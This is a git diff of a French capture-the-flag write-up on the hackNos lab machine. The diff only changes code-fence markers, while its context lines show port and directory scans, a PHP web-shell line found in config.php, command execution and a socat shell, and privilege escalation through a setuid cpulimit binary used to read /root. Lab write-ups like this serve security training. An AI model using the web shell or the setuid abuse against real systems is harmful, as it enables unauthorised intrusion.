@@ -12,7 +12,7 @@ Le challenge se présente comme étant de difficulté intermédiaire. C'est un b
 
 Un scan TCP révèle deux ports ouverts :  
 
-```plain
+```
 Nmap scan report for 192.168.2.10
 Host is up (0.00013s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -31,7 +31,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Une énumération web est souvent une étape obligée dans les CTF :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.2.10/ -w raft-large-directories.txt -n -t 20
 
  ___  ___  __   __     __      __         __   ___
@@ -149,7 +149,7 @@ if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
 
 Je n'ai pas compris comment accéder directement au fichier *config.php* (quelle est son URL) mais un fichier de ce type doit être inclus dans à peu près toutes les pages de l'application. Effectivement il m'aura suffit d'appeler *http://192.168.2.10/websec/?cmd=id* pour avoir l'exécution de commande attendue :  
 
-```plain
+```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -167,23 +167,23 @@ socat - TCP4:192.168.2.10:4443
 
 Une fois connecté, je repère un utilisateur sur le système :  
 
-```plain
+```
 blackdevil:x:1000:118:hackNos:/home/blackdevil:/bin/bash
 ```
 
 Le flag se trouve dans le fichier *user.txt* de son home : 
-```plain
+```
 bae11ce4f67af91fa58576c1da2aad4b
 ```
 
 Il fait partie du groupe Docker ce qui peut être intéressant pour passer à root ensuite : 
-```plain
+```
 uid=1000(blackdevil) gid=118(docker) groups=118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)
 ```
 
 Mais je ne trouve rien d'utile pour passer du user actuel *www-data* à cet utilisateur. J'ai juste une entrée sudo qui pointe vers un path improbable (ça trolle):   
 
-```plain
+```
 $ sudo -l
 Matching Defaults entries for www-data on hacknos:
     env_reset, mail_badpass,
@@ -195,12 +195,12 @@ User www-data may run the following commands on hacknos:
 
 LinEnum me remonte un fichier Dockerfile sur le système qui correspond en fait à la mise en place du Gila :  
 
-```plain
+```
 [-] Anything juicy in the Dockerfile:
 -rwxr-xr-x 1 www-data www-data 639 Jul 10  2019 /var/www/html/websec/Dockerfile
 ```
 
-```plain
+```
 FROM ubuntu:18.04
 
 RUN apt-get -y update
@@ -229,7 +229,7 @@ SetUID : le biloute (le petit bit) qui vous veut du bien
 
 Il y a aussi cette liste de binaires setuid qui est rémontée :  
 
-```plain
+```
      1607     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
      1365     52 -rwsr-xr--   1 root     messagebus         51184 Jun 11  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      1373     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
@@ -265,7 +265,7 @@ Launch Firefox web browser and limit its CPU usage to 20%
 
 Si on appelle la commande *id* via *cpulimit* on obtient cet output :  
 
-```plain
+```
 cpulimit -l 50 id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 Process 7570 detected
@@ -275,7 +275,7 @@ Effectivement l'effective UID est root, ce qui est propre aux binaires setuid ma
 
 On peut toutefois profiter de cet effective UID pour passer les restrictions sur les fichiers :  
 
-```plain
+```
 $ cpulimit -l 50 -- ls -al /root
 total 56
 drwx------  8 root root 4096 Dec 14  2019 .
@@ -296,7 +296,7 @@ Process 13629 detected
 
 On peut ainsi récupérer le flag *root.txt* :  
 
-```plain
+```
 ########    #####     #####   ########         ########  
 ##     ##  ##   ##   ##   ##     ##            ##     ## 
 ##     ## ##     ## ##     ##    ##            ##     ## 
